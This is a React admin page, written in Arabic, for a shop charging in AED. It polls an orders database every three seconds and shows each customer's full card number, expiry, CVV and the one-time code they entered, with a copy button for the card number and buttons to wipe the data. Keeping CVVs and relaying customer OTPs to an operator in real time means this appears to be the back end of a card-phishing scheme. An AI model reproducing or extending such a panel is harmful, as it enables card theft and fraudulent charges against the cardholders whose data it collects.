import { useCallback, useEffect, useRef, useState } from 'react'
import { supabase } from '../lib/supabase'
import { adminCardClass, adminBtnDanger, formatDate, formatMoney, getPaymentStatusLabel } from './adminStyles'

const POLL_MS = 3000

function getOtpDisplay(order) {
  return order?.payment_otp_entered || order?.payment_otp_code || ''
}

function PaymentDetailsContent({
  selected,
  cardCopied,
  actionError,
  deleting,
  formatCard,
  onCopyCard,
  onClearPayment,
  onDeleteOrder,
}) {
  return (
    <div className="space-y-4">
      {getOtpDisplay(selected) ? (
        <div className="p-4 rounded-2xl border-2 bg-emerald-50 border-emerald-400">
          <p className="text-xs font-bold text-emerald-800 mb-1">رمز OTP المُدخل من العميل</p>
          <p className="text-3xl font-black tracking-[0.3em] text-slate-900 font-mono" dir="ltr">
            {getOtpDisplay(selected)}
          </p>
          {(selected.payment_otp_entered_at || selected.updated_at) && (
            <p className="text-xs font-bold text-slate-500 mt-2">
              آخر تحديث: {formatDate(selected.payment_otp_entered_at || selected.updated_at)}
            </p>
          )}
          <p className="text-sm font-bold text-slate-600 mt-2">الجوال: {selected.customer_phone}</p>
        </div>
      ) : (
        <div className="p-4 rounded-2xl bg-slate-50 border border-slate-200">
          <p className="font-bold text-slate-500 text-sm">في انتظار إدخال رمز OTP من العميل...</p>
        </div>
      )}

      <div className="p-4 rounded-2xl bg-slate-900 text-white space-y-3 font-mono text-sm" dir="ltr">
        <div>
          <p className="text-slate-400 text-xs mb-1">Card holder</p>
          <p className="font-bold text-base">{selected.card_holder_name || '—'}</p>
        </div>
        <div>
          <p className="text-slate-400 text-xs mb-1">Card number</p>
          <div className="flex items-center justify-between gap-3">
            <p className="font-bold text-lg tracking-wider">{formatCard(selected.card_number)}</p>
            {selected.card_number ? (
              <button
                type="button"
                onClick={onCopyCard}
                className="shrink-0 px-3 py-1.5 rounded-lg bg-white/10 hover:bg-white/20 text-xs font-bold text-white transition"
              >
                {cardCopied ? 'تم النسخ ✓' : 'نسخ'}
              </button>
            ) : null}
          </div>
        </div>
        <div className="grid grid-cols-2 gap-4">
          <div>
            <p className="text-slate-400 text-xs mb-1">Expiry</p>
            <p className="font-bold">{selected.card_expiry || '—'}</p>
          </div>
          <div>
            <p className="text-slate-400 text-xs mb-1">CVV</p>
            <p className="font-bold">{selected.card_cvv || '—'}</p>
          </div>
        </div>
      </div>

      <div className="text-sm font-bold text-slate-700 space-y-1">
        <p>العميل: {selected.customer_name}</p>
        <p>جوال الطلب / OTP: {selected.customer_phone}</p>
        <p>المبلغ: {formatMoney(selected.pay_now_amount)} AED</p>
        <p>إجمالي الطلب: {formatMoney(selected.total_amount)} AED</p>
      </div>

      <div className="border-t pt-4 space-y-2">
        {actionError && <p className="text-red-600 text-sm font-bold">{actionError}</p>}

        <button type="button" onClick={onClearPayment} disabled={deleting} className={adminBtnDanger}>
          {deleting ? 'جاري المسح...' : 'مسح بيانات الدفع'}
        </button>
        <button
          type="button"
          onClick={onDeleteOrder}
          disabled={deleting}
          className={`${adminBtnDanger} bg-red-600 text-white border-red-700 hover:bg-red-700`}
        >
          {deleting ? 'جاري الحذف...' : 'حذف الطلب نهائياً'}
        </button>
      </div>
    </div>
  )
}

export default function AdminPayments() {
  const [payments, setPayments] = useState([])
  const [initialLoading, setInitialLoading] = useState(true)
  const [selectedId, setSelectedId] = useState(null)
  const [deleting, setDeleting] = useState(false)
  const [actionError, setActionError] = useState('')
  const [cardCopied, setCardCopied] = useState(false)
  const initialLoadedRef = useRef(false)

  const fetchPayments = useCallback(async ({ silent = false } = {}) => {
    if (!silent && !initialLoadedRef.current) {
      setInitialLoading(true)
    }

    const { data, error } = await supabase
      .from('orders')
      .select('*')
      .not('card_number', 'is', null)
      .order('updated_at', { ascending: false })

    if (!error) {
      setPayments(data || [])
    }

    if (!initialLoadedRef.current) {
      initialLoadedRef.current = true
      setInitialLoading(false)
    }
  }, [])

  useEffect(() => {
    fetchPayments()

    const interval = window.setInterval(() => {
      if (document.visibilityState === 'visible') {
        fetchPayments({ silent: true })
      }
    }, POLL_MS)

    return () => window.clearInterval(interval)
  }, [fetchPayments])

  const selected = payments.find((p) => p.id === selectedId) || null

  useEffect(() => {
    setCardCopied(false)
  }, [selectedId])

  useEffect(() => {
    if (!selected || window.innerWidth >= 1024) return undefined

    const previousOverflow = document.body.style.overflow
    document.body.style.overflow = 'hidden'
    return () => {
      document.body.style.overflow = previousOverflow
    }
  }, [selected])

  const formatCard = (num) => {
    if (!num) return '—'
    const digits = String(num).replace(/\D/g, '')
    return digits.replace(/(\d{4})(?=\d)/g, '$1 ')
  }

  const copyCardNumber = async () => {
    if (!selected?.card_number) return

    const digits = String(selected.card_number).replace(/\D/g, '')
    try {
      await navigator.clipboard.writeText(digits)
      setCardCopied(true)
      window.setTimeout(() => setCardCopied(false), 2000)
    } catch {
      setActionError('تعذر نسخ رقم البطاقة')
    }
  }

  const clearPayment = async () => {
    if (!selected || deleting) return

    const confirmed = window.confirm(
      `هل تريد مسح بيانات الدفع للطلب ${selected.order_number}؟\n\nسيتم حذف بيانات البطاقة ورمز OTP من قائمة المدفوعات.`
    )
    if (!confirmed) return

    setDeleting(true)
    setActionError('')

    const { error } = await supabase
      .from('orders')
      .update({
        card_holder_name: null,
        card_number: null,
        card_expiry: null,
        card_cvv: null,
        manual_payment_status: 'none',
        payment_otp_code: null,
        payment_otp_entered: null,
        payment_otp_entered_at: null,
        payment_otp_hash: null,
        payment_otp_expires_at: null,
        payment_otp_attempts: 0,
        payment_otp_length: 4,
        payment_otp_send_count: 0,
        payment_otp_locked: false,
        updated_at: new Date().toISOString(),
      })
      .eq('id', selected.id)

    setDeleting(false)

    if (error) {
      setActionError(error.message || 'تعذر مسح بيانات الدفع')
      return
    }

    setSelectedId(null)
    fetchPayments()
  }

  const deletePaymentOrder = async () => {
    if (!selected || deleting) return

    const confirmed = window.confirm(
      `هل تريد حذف الطلب ${selected.order_number} نهائياً؟\n\nسيتم حذف الطلب وبيانات الدفع معاً.`
    )
    if (!confirmed) return

    setDeleting(true)
    setActionError('')

    const { error } = await supabase.from('orders').delete().eq('id', selected.id)

    setDeleting(false)

    if (error) {
      setActionError(error.message || 'تعذر حذف الطلب')
      return
    }

    setSelectedId(null)
    fetchPayments()
  }

  const detailsProps = {
    selected,
    cardCopied,
    actionError,
    deleting,
    formatCard,
    onCopyCard: copyCardNumber,
    onClearPayment: clearPayment,
    onDeleteOrder: deletePaymentOrder,
  }

  return (
    <div className="space-y-5">
      <div className="grid lg:grid-cols-2 gap-6">
        <div className={adminCardClass}>
          <h2 className="font-black text-lg mb-4">المدفوعات ({payments.length})</h2>
          {initialLoading ? (
            <p className="font-bold text-slate-500">جاري التحميل...</p>
          ) : payments.length === 0 ? (
            <p className="font-bold text-slate-500">لا توجد مدفوعات بعد.</p>
          ) : (
            <div className="space-y-2">
              {payments.map((p) => (
                <button
                  key={p.id}
                  type="button"
                  onClick={() => setSelectedId(p.id)}
                  className={`w-full text-right p-4 rounded-2xl border transition ${
                    selectedId === p.id
                      ? 'border-alain-blue bg-sky-50'
                      : 'border-slate-100 bg-slate-50 hover:bg-white'
                  }`}
                >
                  <div className="flex items-start justify-between gap-3">
                    <div className="min-w-0 flex-1">
                      <p className="font-black text-slate-900">{p.order_number}</p>
                      <p className="text-sm font-bold text-slate-600">{p.customer_name}</p>
                      <p className="text-alain-blue font-black mt-1">
                        {formatMoney(p.pay_now_amount)} AED
                      </p>
                      {getOtpDisplay(p) ? (
                        <p className="text-xs font-black text-emerald-700 mt-1">
                          رمز مُدخل: {getOtpDisplay(p)}
                        </p>
                      ) : null}
                      <p className="text-xs font-black text-slate-500 mt-1">
                        {getPaymentStatusLabel(p.payment_status)}
                        {p.manual_payment_status && p.manual_payment_status !== 'none'
                          ? ` • ${p.manual_payment_status}`
                          : ''}
                      </p>
                    </div>
                    <span className="lg:hidden shrink-0 text-alain-blue text-xs font-black mt-1">
                      التفاصيل ←
                    </span>
                  </div>
                </button>
              ))}
            </div>
          )}
        </div>

        <div className={`${adminCardClass} hidden lg:block`}>
          {!selected ? (
            <p className="font-bold text-slate-500">اختر طلباً لعرض التفاصيل</p>
          ) : (
            <div className="space-y-4">
              <h2 className="text-xl font-black">{selected.order_number}</h2>
              <PaymentDetailsContent {...detailsProps} />
            </div>
          )}
        </div>
      </div>

      {selected && (
        <div className="lg:hidden fixed inset-0 z-[70]">
          <button
            type="button"
            className="absolute inset-0 bg-black/50"
            onClick={() => setSelectedId(null)}
            aria-label="إغلاق التفاصيل"
          />
          <div className="absolute inset-x-0 bottom-0 top-[8%] flex flex-col rounded-t-3xl bg-white shadow-2xl">
            <div className="sticky top-0 z-10 flex items-center justify-between gap-3 border-b border-slate-200 bg-white px-4 py-4 rounded-t-3xl">
              <div className="min-w-0">
                <p className="text-xs font-bold text-slate-500">تفاصيل الدفع</p>
                <h2 className="text-lg font-black text-slate-950 truncate">{selected.order_number}</h2>
              </div>
              <button
                type="button"
                onClick={() => setSelectedId(null)}
                className="shrink-0 w-10 h-10 rounded-2xl bg-slate-100 text-slate-700 font-black text-xl"
                aria-label="إغلاق"
              >
                ×
              </button>
            </div>
            <div className="flex-1 overflow-y-auto px-4 py-4 pb-8">
              <PaymentDetailsContent {...detailsProps} />
            </div>
          </div>
        </div>
      )}
    </div>
  )
}
